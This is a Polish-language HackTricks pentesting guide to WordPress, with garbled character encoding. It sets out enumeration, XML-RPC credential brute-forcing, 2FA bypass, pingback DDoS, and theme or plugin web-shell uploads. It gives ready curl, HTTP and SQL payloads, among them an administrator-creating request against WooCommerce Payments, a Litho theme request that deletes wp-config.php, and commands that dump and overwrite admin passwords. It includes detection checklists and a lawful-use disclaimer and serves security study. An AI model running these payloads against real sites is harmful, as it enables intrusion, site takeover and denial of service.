# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Podstawowe informacje

- **PrzesÅ‚ane** pliki trafiajÄ… do: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Pliki motywÃ³w moÅ¼na znaleÅºÄ‡ w /wp-content/themes/,** wiÄ™c jeÅ›li zmienisz jakiÅ› php motywu, aby uzyskaÄ‡ RCE, prawdopodobnie bÄ™dziesz korzystaÄ‡ z tej Å›cieÅ¼ki. Na przykÅ‚ad: uÅ¼ywajÄ…c **theme twentytwelve** moÅ¼esz **dostÄ™p** do pliku **404.php** pod adresem: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Inny przydatny adres URL moÅ¼e byÄ‡:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- W **wp-config.php** moÅ¼esz znaleÅºÄ‡ hasÅ‚o roota do bazy danych.
- DomyÅ›lne Å›cieÅ¼ki logowania do sprawdzenia: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **GÅ‚Ã³wne pliki WordPress**

- `index.php`
- `license.txt` zawiera przydatne informacje, takie jak zainstalowana wersja WordPress.
- `wp-activate.php` jest uÅ¼ywany do procesu aktywacji przez e-mail przy zakÅ‚adaniu nowej witryny WordPress.
- Foldery logowania (mogÄ… byÄ‡ przemianowane, aby je ukryÄ‡):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` to plik reprezentujÄ…cy funkcjÄ™ WordPress umoÅ¼liwiajÄ…cÄ… przesyÅ‚anie danych z uÅ¼yciem HTTP jako mechanizmu transportu i XML jako mechanizmu kodowania. Ten typ komunikacji zostaÅ‚ zastÄ…piony przez WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- Folder `wp-content` to gÅ‚Ã³wny katalog, w ktÃ³rym przechowywane sÄ… pluginy i motywy.
- `wp-content/uploads/` to katalog, w ktÃ³rym przechowywane sÄ… wszystkie pliki przesÅ‚ane na platformÄ™.
- `wp-includes/` to katalog, gdzie przechowywane sÄ… pliki rdzenia, takie jak certyfikaty, czcionki, pliki JavaScript i widgety.
- `wp-sitemap.xml` W wersjach WordPress 5.5 i nowszych, WordPress generuje plik sitemap XML ze wszystkimi publicznymi wpisami oraz publicznie queryable typami postÃ³w i taksonomiami.

**Post exploitation**

- Plik `wp-config.php` zawiera informacje wymagane przez WordPress do poÅ‚Ä…czenia z bazÄ… danych, takie jak nazwa bazy danych, host bazy danych, nazwa uÅ¼ytkownika i hasÅ‚o, klucze uwierzytelniania i salts oraz prefiks tabel bazy danych. Ten plik konfiguracyjny moÅ¼e byÄ‡ rÃ³wnieÅ¼ uÅ¼yty do wÅ‚Ä…czenia trybu DEBUG, co moÅ¼e byÄ‡ przydatne przy rozwiÄ…zywaniu problemÃ³w.

### Uprawnienia uÅ¼ytkownikÃ³w

- **Administrator**
- **Editor**: Publikuje i zarzÄ…dza wÅ‚asnymi i cudzymi wpisami
- **Author**: Publikuje i zarzÄ…dza wÅ‚asnymi wpisami
- **Contributor**: Pisze i zarzÄ…dza swoimi wpisami, ale nie moÅ¼e ich publikowaÄ‡
- **Subscriber**: PrzeglÄ…da wpisy i edytuje swÃ³j profil

## **Passive Enumeration**

### **SprawdÅº wersjÄ™ WordPress**

SprawdÅº, czy moÅ¼esz znaleÅºÄ‡ pliki `/license.txt` lub `/readme.html`

W **kodzie ÅºrÃ³dÅ‚owym** strony (przykÅ‚ad z [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Pliki linkÃ³w CSS

![](<../../images/image (533).png>)

- Pliki JavaScript

![](<../../images/image (524).png>)

### Pobierz wtyczki
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Pobierz motywy
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### WyodrÄ™bnianie wersji â€” ogÃ³lnie
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Aktywna enumeracja

### Wtyczki i motywy

Prawdopodobnie nie uda Ci siÄ™ znaleÅºÄ‡ wszystkich moÅ¼liwych wtyczek i motywÃ³w. Aby odkryÄ‡ je wszystkie, bÄ™dziesz musiaÅ‚ **actively Brute Force a list of Plugins and Themes** (miejmy nadziejÄ™, Å¼e istniejÄ… zautomatyzowane narzÄ™dzia zawierajÄ…ce te listy).

### UÅ¼ytkownicy

- **ID Brute:** Uzyskujesz poprawnych uÅ¼ytkownikÃ³w z serwisu WordPress przez Brute Forcing ID uÅ¼ytkownikÃ³w:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
JeÅ›li odpowiedzi majÄ… status **200** lub **30X**, to oznacza, Å¼e id jest **prawidÅ‚owe**. JeÅ›li odpowiedÅº ma status **400**, to id jest **nieprawidÅ‚owe**.

- **wp-json:** MoÅ¼esz takÅ¼e sprÃ³bowaÄ‡ uzyskaÄ‡ informacje o uÅ¼ytkownikach, zapytujÄ…c:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Kolejny endpoint `/wp-json/`, ktÃ³ry moÅ¼e ujawniÄ‡ pewne informacje o uÅ¼ytkownikach, to:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
ZwrÃ³Ä‡ uwagÄ™, Å¼e ten endpoint ujawnia tylko uÅ¼ytkownikÃ³w, ktÃ³rzy opublikowali wpis. **Dostarczone bÄ™dÄ… tylko informacje o uÅ¼ytkownikach, ktÃ³rzy majÄ… tÄ™ funkcjÄ™ wÅ‚Ä…czonÄ…**.

RÃ³wnieÅ¼ zwrÃ³Ä‡ uwagÄ™, Å¼e **/wp-json/wp/v2/pages** moÅ¼e powodowaÄ‡ leak adresÃ³w IP.

- **Login username enumeration**: Podczas logowania w **`/wp-login.php`** **komunikat** jest **inny** i wskazuje, czy podany **username** istnieje czy nie.

### XML-RPC

JeÅ›li `xml-rpc.php` jest aktywny, moÅ¼esz przeprowadziÄ‡ brute-force poÅ›wiadczeÅ„ lub uÅ¼yÄ‡ go do przeprowadzenia DoS na inne zasoby. (MoÅ¼esz zautomatyzowaÄ‡ ten proces[ using this](https://github.com/relarizky/wpxploit) na przykÅ‚ad).

Aby sprawdziÄ‡, czy jest aktywny, sprÃ³buj uzyskaÄ‡ dostÄ™p do _**/xmlrpc.php**_ i wysÅ‚aÄ‡ to Å¼Ä…danie:

**SprawdÅº**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** lub **`metaWeblog.getUsersBlogs`** sÄ… niektÃ³rymi z metod, ktÃ³re moÅ¼na uÅ¼yÄ‡ do brute-force credentials. JeÅ›li znajdziesz ktÃ³rÄ…kolwiek z nich, moÅ¼esz wysÅ‚aÄ‡ coÅ› takiego:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Komunikat _"NieprawidÅ‚owa nazwa uÅ¼ytkownika lub hasÅ‚o"_ w odpowiedzi z kodem 200 powinien siÄ™ pojawiÄ‡, jeÅ›li dane logowania sÄ… nieprawidÅ‚owe.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

UÅ¼ywajÄ…c poprawnych danych logowania moÅ¼esz przesÅ‚aÄ‡ plik. W odpowiedzi pojawi siÄ™ Å›cieÅ¼ka ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Also there is a **faster way** to brute-force credentials using **`system.multicall`** as you can try several credentials on the same request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Metoda ta jest przeznaczona dla programÃ³w, nie dla ludzi, i jest stara, wiÄ™c nie obsÅ‚uguje 2FA. JeÅ›li wiÄ™c masz waÅ¼ne creds, ale gÅ‚Ã³wny dostÄ™p jest chroniony przez 2FA, **moÅ¼esz byÄ‡ w stanie wykorzystaÄ‡ xmlrpc.php, aby zalogowaÄ‡ siÄ™ tymi creds, omijajÄ…c 2FA**. ZauwaÅ¼, Å¼e nie bÄ™dziesz w stanie wykonaÄ‡ wszystkich akcji dostÄ™pnych przez konsolÄ™, ale nadal moÅ¼esz uzyskaÄ‡ RCE, jak wyjaÅ›nia Ippsec w [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

If you can find the method _**pingback.ping**_ inside the list you can make the Wordpress send an arbitrary request to any host/port.\
This can be used to ask **thousands** of Wordpress **sites** to **access** one **location** (so a **DDoS** is caused in that location) or you can use it to make **Wordpress** to **scan** some internal **network** (you can indicate any port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

JeÅ›li otrzymasz **faultCode** o wartoÅ›ci **wiÄ™kszej** niÅ¼ **0** (17), oznacza to, Å¼e port jest otwarty.

ZwrÃ³Ä‡ uwagÄ™ na uÅ¼ycie **`system.multicall`** w poprzedniej sekcji, aby dowiedzieÄ‡ siÄ™, jak naduÅ¼yÄ‡ tej metody, by spowodowaÄ‡ DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Ten plik zwykle znajduje siÄ™ w katalogu root strony Wordpress: **`/wp-cron.php`**\
Kiedy do tego pliku jest **uzyskany dostÄ™p**, wykonywane jest "**heavy**" MySQL **query**, wiÄ™c moÅ¼e byÄ‡ uÅ¼yty przez **atakujÄ…cych** do **spowodowania** **DoS**.\
Ponadto, domyÅ›lnie `wp-cron.php` jest wywoÅ‚ywany przy kaÅ¼dym Å‚adowaniu strony (za kaÅ¼dym razem, gdy klient Å¼Ä…da dowolnej strony Wordpress), co na stronach o duÅ¼ym ruchu moÅ¼e powodowaÄ‡ problemy (DoS).

Zaleca siÄ™ wyÅ‚Ä…czyÄ‡ Wp-Cron i utworzyÄ‡ prawdziwe cronjob na hoÅ›cie, ktÃ³re bÄ™dÄ… wykonywaÄ‡ potrzebne akcje w regularnych odstÄ™pach (bez powodowania problemÃ³w).

### /wp-json/oembed/1.0/proxy - SSRF

SprÃ³buj uzyskaÄ‡ dostÄ™p do _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ a strona Worpress moÅ¼e wysÅ‚aÄ‡ Å¼Ä…danie do Ciebie.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

To narzÄ™dzie sprawdza, czy istnieje **methodName: pingback.ping** oraz Å›cieÅ¼ka **/wp-json/oembed/1.0/proxy**, a jeÅ›li tak, prÃ³buje je wykorzystaÄ‡.

## NarzÄ™dzia automatyczne
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Uzyskanie dostÄ™pu przez nadpisanie bitu

To bardziej ciekawostka niÅ¼ prawdziwy atak. W CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) moÅ¼na byÅ‚o zmieniÄ‡ 1 bit w dowolnym pliku wordpress. DziÄ™ki temu moÅ¼na byÅ‚o zmieniÄ‡ bit na pozycji `5389` w pliku `/var/www/html/wp-includes/user.php`, aby zastÄ…piÄ‡ operacjÄ™ NOT (`!`) instrukcjÄ… NOP.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modyfikacja pliku php w uÅ¼ywanym motywie (admin credentials needed)**

WyglÄ…d â†’ Edytor motywu â†’ Szablon 404 (po prawej)

ZmieÅ„ zawartoÅ›Ä‡ na php shell:

![](<../../images/image (384).png>)

Wyszukaj w internecie, jak uzyskaÄ‡ dostÄ™p do zaktualizowanej strony. W tym przypadku musisz wejÅ›Ä‡ tutaj: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

MoÅ¼esz uÅ¼yÄ‡:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Plugin RCE

### PHP plugin

MoÅ¼e byÄ‡ moÅ¼liwe przesÅ‚anie plikÃ³w .php jako wtyczki.\
UtwÃ³rz swÃ³j backdoor w PHP uÅ¼ywajÄ…c na przykÅ‚ad:

![](<../../images/image (183).png>)

NastÄ™pnie dodaj nowÄ… wtyczkÄ™:

![](<../../images/image (722).png>)

PrzeÅ›lij wtyczkÄ™ i naciÅ›nij "Install Now":

![](<../../images/image (249).png>)

Kliknij "Proceed":

![](<../../images/image (70).png>)

Prawdopodobnie pozornie nic siÄ™ nie stanie, ale jeÅ›li przejdziesz do Media, zobaczysz przesÅ‚any shell:

![](<../../images/image (462).png>)

OtwÃ³rz go, a zobaczysz URL do wykonania reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Ta metoda polega na instalacji zÅ‚oÅ›liwej wtyczki znanej z podatnoÅ›ci, ktÃ³rÄ… moÅ¼na wykorzystaÄ‡ do uzyskania web shella. Proces przeprowadza siÄ™ przez WordPress dashboard w nastÄ™pujÄ…cy sposÃ³b:

1. **Plugin Acquisition**: Wtyczka jest pobierana ze ÅºrÃ³dÅ‚a takiego jak Exploit DB, np. [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- PrzejdÅº do pulpitu WordPress, nastÄ™pnie do `Dashboard > Plugins > Upload Plugin`.
- PrzeÅ›lij plik zip z pobranÄ… wtyczkÄ….
3. **Plugin Activation**: Po pomyÅ›lnej instalacji wtyczka musi zostaÄ‡ aktywowana poprzez pulpit.
4. **Exploitation**:
- Po zainstalowaniu i aktywowaniu wtyczki "reflex-gallery" moÅ¼na jÄ… wykorzystaÄ‡, poniewaÅ¼ jest znana z podatnoÅ›ci.
- Framework Metasploit dostarcza exploit dla tej podatnoÅ›ci. ÅadujÄ…c odpowiedni moduÅ‚ i wykonujÄ…c konkretne polecenia moÅ¼na uzyskaÄ‡ sesjÄ™ meterpreter, co daje nieautoryzowany dostÄ™p do strony.
- NaleÅ¼y zaznaczyÄ‡, Å¼e jest to tylko jedna z wielu metod eksploatacji strony WordPress.

TreÅ›Ä‡ zawiera ilustracje przedstawiajÄ…ce kroki w dashboardzie WordPress zwiÄ…zane z instalacjÄ… i aktywacjÄ… wtyczki. WaÅ¼ne jest jednak, aby pamiÄ™taÄ‡, Å¼e wykorzystywanie podatnoÅ›ci w ten sposÃ³b jest nielegalne i nieetyczne bez odpowiedniej autoryzacji. Informacje te powinny byÄ‡ wykorzystywane odpowiedzialnie i jedynie w kontekÅ›cie prawnym, np. podczas testÃ³w penetracyjnych z wyraÅºnym pozwoleniem.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ to skrypt zaprojektowany do eskalacji podatnoÅ›ci typu **Cross-Site Scripting (XSS)** do **Remote Code Execution (RCE)** lub innych krytycznych podatnoÅ›ci w WordPress. Po wiÄ™cej informacji zobacz [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Dostarcza **wsparcie dla wersji Wordpress 6.X.X, 5.X.X i 4.X.X i pozwala na:**
- _**Privilege Escalation:**_ Tworzy uÅ¼ytkownika w WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Wgraj swÃ³j niestandardowy plugin (backdoor) do WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Edytuj wbudowane wtyczki w WordPress.
- _**(RCE) Built-In Theme Edit:**_ Edytuj wbudowane motywy w WordPress.
- _**(Custom) Custom Exploits:**_ Niestandardowe exploity dla wtyczek/motywÃ³w firm trzecich WordPress.

## Post Exploitation

WyodrÄ™bnij nazwy uÅ¼ytkownikÃ³w i hasÅ‚a:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
ZmieÅ„ admin password:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Pentest wtyczek Wordpress

### Powierzchnia ataku

ZnajomoÅ›Ä‡ sposobu, w jaki wtyczka Wordpress moÅ¼e ujawniaÄ‡ funkcjonalnoÅ›Ä‡, jest kluczowa do znalezienia podatnoÅ›ci w jej funkcjonalnoÅ›ciach. MoÅ¼esz znaleÅºÄ‡, jak wtyczka moÅ¼e udostÄ™pniaÄ‡ funkcje, w poniÅ¼szych punktach oraz kilka przykÅ‚adÃ³w podatnych wtyczek w [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Jednym ze sposobÃ³w, w jaki wtyczka moÅ¼e udostÄ™pniaÄ‡ funkcje uÅ¼ytkownikom, jest za poÅ›rednictwem AJAX handlers. MogÄ… one zawieraÄ‡ bÅ‚Ä™dy w logice, autoryzacji lub uwierzytelnianiu. Co wiÄ™cej, doÅ›Ä‡ czÄ™sto funkcje te bÄ™dÄ… opieraÄ‡ zarÃ³wno uwierzytelnianie, jak i autoryzacjÄ™ na istnieniu wordpress nonce, ktÃ³re **kaÅ¼dy uÅ¼ytkownik uwierzytelniony w instancji Wordpress moÅ¼e mieÄ‡** (niezaleÅ¼nie od jego roli).

To sÄ… funkcje, ktÃ³re mogÄ… byÄ‡ uÅ¼yte do udostÄ™pnienia funkcji we wtyczce:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**UÅ¼ycie `nopriv` sprawia, Å¼e endpoint jest dostÄ™pny dla wszystkich uÅ¼ytkownikÃ³w (nawet niezalogowanych).**

> [!CAUTION]
> Co wiÄ™cej, jeÅ›li funkcja jedynie sprawdza autoryzacjÄ™ uÅ¼ytkownika za pomocÄ… funkcji `wp_verify_nonce`, to ta funkcja tylko weryfikuje, czy uÅ¼ytkownik jest zalogowany, zwykle nie sprawdza roli uÅ¼ytkownika. W rezultacie uÅ¼ytkownicy o niskich uprawnieniach mogÄ… mieÄ‡ dostÄ™p do dziaÅ‚aÅ„ wymagajÄ…cych wyÅ¼szych uprawnieÅ„.

- **REST API**

MoÅ¼liwe jest rÃ³wnieÅ¼ udostÄ™pnienie funkcji z wordpress poprzez zarejestrowanie REST API za pomocÄ… funkcji `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` jest funkcjÄ… zwrotnÄ…, ktÃ³ra sprawdza, czy dany uÅ¼ytkownik jest uprawniony do wywoÅ‚ania metody API.

**JeÅ›li uÅ¼yta zostanie wbudowana funkcja `__return_true`, po prostu pominie sprawdzenie uprawnieÅ„ uÅ¼ytkownika.**

- **BezpoÅ›redni dostÄ™p do pliku PHP**

OczywiÅ›cie Wordpress uÅ¼ywa PHP, a pliki wewnÄ…trz wtyczek sÄ… bezpoÅ›rednio dostÄ™pne z internetu. JeÅ›li wtyczka ujawnia jakÄ…kolwiek podatnÄ… funkcjonalnoÅ›Ä‡, ktÃ³ra jest uruchamiana po samym dostÄ™pie do pliku, bÄ™dzie ona moÅ¼liwa do wykorzystania przez dowolnego uÅ¼ytkownika.

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

NiektÃ³re wtyczki implementujÄ… skrÃ³ty â€œtrusted headerâ€ dla integracji wewnÄ™trznych lub reverse proxy i nastÄ™pnie uÅ¼ywajÄ… tego nagÅ‚Ã³wka do ustawienia kontekstu bieÅ¼Ä…cego uÅ¼ytkownika dla Å¼Ä…daÅ„ REST. JeÅ›li nagÅ‚Ã³wek nie jest kryptograficznie powiÄ…zany z Å¼Ä…daniem przez komponent upstream, atakujÄ…cy moÅ¼e go sfaÅ‚szowaÄ‡ i uzyskaÄ‡ dostÄ™p do uprzywilejowanych tras REST jako administrator.

- Impact: eskalacja uprawnieÅ„ bez uwierzytelnienia do administratora przez utworzenie nowego administratora za pomocÄ… core users REST route.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (wymusza user ID 1, zazwyczaj pierwsze konto administratora).
- Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Why it works

- The plugin maps a client-controlled header to authentication state and skips capability checks.
- WordPress core expects `create_users` capability for this route; the plugin hack bypasses it by directly setting the current user context from the header.

Expected success indicators

- HTTP 201 with a JSON body describing the created user.
- A new admin user visible in `wp-admin/users.php`.

Detection checklist

- Grep for `getallheaders()`, `$_SERVER['HTTP_...']`, or vendor SDKs that read custom headers to set user context (e.g., `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Review REST registrations for privileged callbacks that lack robust `permission_callback` checks and instead rely on request headers.
- Look for usages of core user-management functions (`wp_insert_user`, `wp_create_user`) inside REST handlers that are gated only by header values.

### Nieautoryzowane dowolne usuwanie plikÃ³w przez wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_` hooks.  When the **_nopriv_** variant is used **the callback becomes reachable by unauthenticated visitors**, so any sensitive action must additionally implement:

1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Strict input sanitisation / validation**.

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Problemy wprowadzone przez ten fragment:

* **DostÄ™p bez uwierzytelnienia** â€“ hook `wp_ajax_nopriv_` jest zarejestrowany.
* **Brak sprawdzenia nonce / uprawnieÅ„** â€“ kaÅ¼dy odwiedzajÄ…cy moÅ¼e trafiÄ‡ w endpoint.
* **Brak sanityzacji Å›cieÅ¼ki** â€“ ciÄ…g kontrolowany przez uÅ¼ytkownika `fontfamily` jest konkatenowany do Å›cieÅ¼ki systemu plikÃ³w bez filtrowania, umoÅ¼liwiajÄ…c klasyczne przejÅ›cie `../../`.

#### Eksploatacja

AtakujÄ…cy moÅ¼e usunÄ…Ä‡ dowolny plik lub katalog **poniÅ¼ej katalogu bazowego uploads** (zwykle `<wp-root>/wp-content/uploads/`) wysyÅ‚ajÄ…c jedno Å¼Ä…danie HTTP POST:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### Detection checklist

* Any `add_action( 'wp_ajax_nopriv_...')` callback that calls filesystem helpers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* Concatenation of unsanitised user input into paths (look for `$_POST`, `$_GET`, `$_REQUEST`).
* Absence of `check_ajax_referer()` and `current_user_can()`/`is_user_logged_in()`.

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

Many plugins implement a "view as role" or temporary role-switching feature by saving the original role(s) in user meta so they can be restored later. If the restoration path relies only on request parameters (e.g., `$_REQUEST['reset-for']`) and a plugin-maintained list without checking capabilities and a valid nonce, this becomes a vertical privilege escalation.

A real-world example was found in the Admin and Site Enhancements (ASE) plugin (â‰¤ 7.6.2.1). The reset branch restored roles based on `reset-for=<username>` if the username appeared in an internal array `$options['viewing_admin_as_role_are']`, but performed neither a `current_user_can()` check nor a nonce verification before removing current roles and re-adding the saved roles from user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Dlaczego jest to podatne

- Polega na zaufaniu do `$_REQUEST['reset-for']` i opcji wtyczki bez autoryzacji po stronie serwera.
- JeÅ›li uÅ¼ytkownik wczeÅ›niej miaÅ‚ wyÅ¼sze uprawnienia zapisane w `_asenha_view_admin_as_original_roles` i zostaÅ‚ zdegradowany, moÅ¼e je przywrÃ³ciÄ‡, przechodzÄ…c na Å›cieÅ¼kÄ™ resetu.
- W niektÃ³rych wdroÅ¼eniach kaÅ¼dy uwierzytelniony uÅ¼ytkownik mÃ³gÅ‚ wywoÅ‚aÄ‡ reset dla innej nazwy uÅ¼ytkownika nadal obecnej w `viewing_admin_as_role_are` (bÅ‚Ä™dna autoryzacja).

Eksploatacja (przykÅ‚ad)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
W podatnych wersjach usuwa to bieÅ¼Ä…ce role i ponownie dodaje zapisane oryginalne role (np. `administrator`), efektywnie eskalujÄ…c uprawnienia.

Detection checklist

- Szukaj funkcji przeÅ‚Ä…czania rÃ³l, ktÃ³re przechowujÄ… â€œoryginalne roleâ€ w user meta (np. `_asenha_view_admin_as_original_roles`).
- Zidentyfikuj Å›cieÅ¼ki reset/restore, ktÃ³re:
- OdczytujÄ… nazwy uÅ¼ytkownikÃ³w z `$_REQUEST` / `$_GET` / `$_POST`.
- ModyfikujÄ… role przez `add_role()` / `remove_role()` bez `current_user_can()` i `wp_verify_nonce()` / `check_admin_referer()`.
- AutoryzujÄ… na podstawie opcji pluginu (np. `viewing_admin_as_role_are`) zamiast uprawnieÅ„ aktora.

---

